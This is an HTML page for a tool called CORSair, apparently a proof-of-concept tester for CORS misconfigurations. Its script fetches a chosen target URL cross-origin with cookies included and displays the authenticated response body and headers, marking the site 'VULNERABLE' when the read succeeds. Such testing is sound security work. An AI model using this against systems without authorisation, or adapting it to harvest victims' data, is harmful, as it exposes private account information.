<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CORSair</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">

<style>
:root{
    --bg:#080809;
    --panel:#121214;
    --panel-2:#17171a;
    --border:#2a2a2e;
    --red:#e53935;
    --red-bright:#ff5252;
    --red-deep:#b71c1c;
    --text:#e8e8ea;
    --muted:#9a9aa0;
}

*{box-sizing:border-box;}

body{
    font-family:'Inter',Arial,Helvetica,sans-serif;
    background:
        radial-gradient(900px 500px at 15% -10%,rgba(229,57,53,.12),transparent 60%),
        radial-gradient(700px 500px at 100% 0%,rgba(229,57,53,.06),transparent 55%),
        var(--bg);
    color:var(--text);
    margin:0;
    min-height:100vh;
    padding:48px 20px;
}

.container{
    max-width:950px;
    margin:auto;
    background:linear-gradient(180deg,var(--panel),var(--panel-2));
    padding:0;
    border-radius:16px;
    border:1px solid var(--border);
    box-shadow:0 24px 60px rgba(0,0,0,.6),0 0 0 1px rgba(229,57,53,.05);
    overflow:hidden;
}

.header{
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    text-align:center;
    gap:12px;
    padding:30px;
    background:linear-gradient(135deg,rgba(229,57,53,.14),transparent 70%);
    border-bottom:1px solid var(--border);
}

.logo{
    width:46px;
    height:46px;
    flex:none;
    border-radius:12px;
    background:linear-gradient(145deg,var(--red),var(--red-deep));
    display:flex;
    align-items:center;
    justify-content:center;
    box-shadow:0 6px 18px rgba(229,57,53,.4);
}

.logo svg{width:26px;height:26px;}

.title-block h1{
    margin:0;
    font-size:30px;
    font-weight:800;
    letter-spacing:-.5px;
    color:#fff;
}

.title-block h1 span{color:var(--red-bright);}

.title-block .sub{
    margin:3px 0 0;
    font-size:13px;
    color:var(--muted);
    letter-spacing:.3px;
}

.body{padding:30px;}

label{
    display:block;
    color:var(--muted);
    font-size:13px;
    font-weight:600;
    text-transform:uppercase;
    letter-spacing:.6px;
    margin-bottom:2px;
}

input#url{
    width:100%;
    padding:14px 16px;
    font-size:15px;
    font-family:'JetBrains Mono',monospace;
    margin-top:8px;
    margin-bottom:20px;
    background:#0c0c0e;
    color:#f5f5f5;
    border:1px solid #3a3a40;
    border-radius:10px;
    transition:border-color .2s,box-shadow .2s;
}

input#url:focus{
    outline:none;
    border-color:var(--red);
    box-shadow:0 0 0 3px rgba(229,57,53,.22);
}

.checkbox-row{
    display:flex;
    align-items:center;
    gap:10px;
    padding:14px 16px;
    background:#0c0c0e;
    border:1px solid #2a2a2e;
    border-radius:10px;
    margin-bottom:22px;
    font-size:14px;
    color:#d0d0d4;
    text-transform:none;
    letter-spacing:normal;
    font-weight:500;
    cursor:pointer;
}

.checkbox-row input[type="checkbox"]{
    width:18px;
    height:18px;
    accent-color:var(--red);
    cursor:pointer;
}

button{
    background:linear-gradient(145deg,var(--red),var(--red-deep));
    color:#fff;
    border:none;
    padding:14px 26px;
    border-radius:10px;
    cursor:pointer;
    font-size:15px;
    font-weight:700;
    letter-spacing:.3px;
    box-shadow:0 8px 22px rgba(229,57,53,.32);
    transition:transform .12s,box-shadow .2s,filter .2s;
}

button:hover{
    filter:brightness(1.08);
    box-shadow:0 10px 28px rgba(229,57,53,.45);
}

button:active{transform:translateY(1px);}

#result{margin-top:26px;}

#result p{color:var(--muted);line-height:1.6;}

.success{
    color:var(--red-bright);
    font-weight:800;
    font-size:24px;
    margin:6px 0 12px;
}

.fail{
    color:var(--muted);
    font-weight:800;
    font-size:24px;
    margin:6px 0 12px;
}

h3{color:#fff;font-weight:700;margin-top:24px;}

table{
    width:100%;
    border-collapse:separate;
    border-spacing:0;
    margin-top:20px;
    border:1px solid var(--border);
    border-radius:10px;
    overflow:hidden;
}

table td{
    border-bottom:1px solid #262629;
    padding:13px 16px;
    color:#dcdce0;
    font-size:14px;
    word-break:break-word;
}

table tr:last-child td{border-bottom:none;}

table td:first-child{
    width:180px;
    background:#0e0e10;
}

table td b{color:var(--red-bright);font-weight:600;}

pre{
    background:#000;
    color:#e0e0e0;
    padding:16px;
    border-radius:10px;
    border:1px solid var(--border);
    overflow:auto;
    max-height:350px;
    font-family:'JetBrains Mono',monospace;
    font-size:13px;
    line-height:1.5;
}

.watermark{
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
    padding:18px 30px 22px;
    border-top:1px solid var(--border);
    font-size:13.5px;
    letter-spacing:.4px;
    color:var(--muted);
    background:linear-gradient(0deg,rgba(229,57,53,.06),transparent);
}

.watermark b{
    color:var(--red-bright);
    font-weight:700;
}

.watermark .sun{
    width:20px;
    height:20px;
    flex:none;
    animation:spin 14s linear infinite;
}

@keyframes spin{to{transform:rotate(360deg);}}
</style>

</head>

<body>

<div class="container">

<div class="header">
<div class="logo">
<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M12 2L3 6v6c0 5 3.5 8.5 9 10 5.5-1.5 9-5 9-10V6l-9-4z" fill="#fff" fill-opacity="0.9"/>
<path d="M9 12l2 2 4-4" stroke="#b71c1c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg>
</div>
<div class="title-block">
<h1>CORS<span>air</span></h1>
<p class="sub">CORS Misconfiguration</p>
</div>
</div>

<div class="body">

<label>Target URL</label>

<input
id="url"
value="https://target.com/api/profile">

<label class="checkbox-row">
<input
type="checkbox"
id="cred"
checked>
Include Cookies (credentials)
</label>

<button onclick="exploit()">
Fetch Response
</button>

<div id="result"></div>

</div>

<div class="watermark">
<svg class="sun" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="12" cy="12" r="4.2" fill="#ffb300"/>
<g stroke="#ff5252" stroke-width="1.8" stroke-linecap="round">
<line x1="12" y1="2.5" x2="12" y2="5"/>
<line x1="12" y1="19" x2="12" y2="21.5"/>
<line x1="2.5" y1="12" x2="5" y2="12"/>
<line x1="19" y1="12" x2="21.5" y2="12"/>
<line x1="5.2" y1="5.2" x2="7" y2="7"/>
<line x1="17" y1="17" x2="18.8" y2="18.8"/>
<line x1="18.8" y1="5.2" x2="17" y2="7"/>
<line x1="7" y1="17" x2="5.2" y2="18.8"/>
</g>
</svg>
<b>SooryaGokul</b>
</div>

</div>

<script>

async function exploit(){

let url=document.getElementById("url").value;

let includeCredentials=document.getElementById("cred").checked;

let credentials=includeCredentials?"include":"omit";

let result=document.getElementById("result");

result.innerHTML="<p>Requesting...</p>";

try{

const response=await fetch(url,{

method:"GET",

mode:"cors",

credentials:credentials

});

const body=await response.text();

let headers="";

response.headers.forEach((value,key)=>{

headers+=key+" : "+value+"<br>";

});

result.innerHTML=`

<h2 class="success">
✅ VULNERABLE
</h2>

<p>
The browser successfully read a cross-origin response.
If this request contained authenticated cookies,
sensitive information may be exposed.
</p>

<table>

<tr>
<td><b>Origin</b></td>
<td>${window.location.origin}</td>
</tr>

<tr>
<td><b>Credentials</b></td>
<td>${credentials}</td>
</tr>

<tr>
<td><b>HTTP Status</b></td>
<td>${response.status}</td>
</tr>

<tr>
<td><b>Response Size</b></td>
<td>${body.length} bytes</td>
</tr>

<tr>
<td><b>Readable Headers</b></td>
<td>${headers || "None"}</td>
</tr>

</table>

<h3>Response Body</h3>

<pre>${escapeHtml(body)}</pre>

`;

}catch(e){

result.innerHTML=`

<h2 class="fail">
❌ NOT VULNERABLE
</h2>

<p>

The browser blocked reading the cross-origin response.

</p>

<p>

Error :

<b>${e.name}</b>

</p>

<pre>

${e.message}

</pre>

`;

}

}

function escapeHtml(text){

const div=document.createElement("div");

div.innerText=text;

return div.innerHTML;

}

</script>

</body>
</html>
